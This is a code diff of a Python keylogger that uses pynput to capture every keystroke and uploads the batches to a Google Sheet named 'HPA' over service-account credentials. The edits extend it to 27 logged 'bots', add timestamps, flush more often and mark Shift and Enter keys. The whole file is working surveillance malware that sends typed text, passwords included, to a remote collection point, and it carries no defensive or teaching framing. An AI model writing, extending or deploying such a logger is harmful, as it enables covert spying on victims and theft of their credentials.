@@ -1,6 +1,7 @@
 import pynput
 import gspread
 from oauth2client.service_account import ServiceAccountCredentials
+from datetime import datetime
 
 from pynput.keyboard import Key, Listener
 
@@ -12,24 +13,23 @@ sheet = client.open('HPA').sheet1
 
 current_cell = 2
 
-for celli in range(1, 17):
+for celli in range(1, 28):
     if sheet.cell(1, celli).value == '':
         current_row = celli
         break
 
-    if celli == 16:
+    if celli == 27:
         quit()
 
-sheet.update_cell(1, current_row, f'Bot {current_row} Online')
+sheet.update_cell(1, current_row, f'Last Updated: {str(datetime.now())}')
 
 keys = []
-
 
 def on_press(key):
     global keys
 
     keys.append(key)
-    if len(keys) > 10:
+    if len(keys) > 8:
         write_out()
         keys = []
 
@@ -39,10 +39,10 @@ def filter_spaces(character):
         return ' '
 
     elif character == Key.enter:
-        return '|E|'
+        return '|Enter|'
 
-    elif character == Key.shift:
-        return '|S|'
+    elif character == Key.shift or character == Key.shift_r:
+        return '|Shift|'
 
     elif character == Key.backspace:
         return '|B|'
@@ -57,18 +57,21 @@ def filter_spaces(character):
 def write_out():
     global keys, current_cell, current_row
 
+    sheet.update_cell(1, current_row, f'Last Updated: {str(datetime.now())}')
+
     keys = list(map(filter_spaces, keys))
     keys = list(map(str, keys))
-
+    
     output = ''.join(keys).replace('\'', '')
 
     sheet.update_cell(current_cell, current_row, output)
     current_cell += 1
-    
+
 
 def on_release(key):
-    pass
-
+    global keys
+    if key == Key.shift or key == Key.shift_r:
+        keys.append('|EndShift|')
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
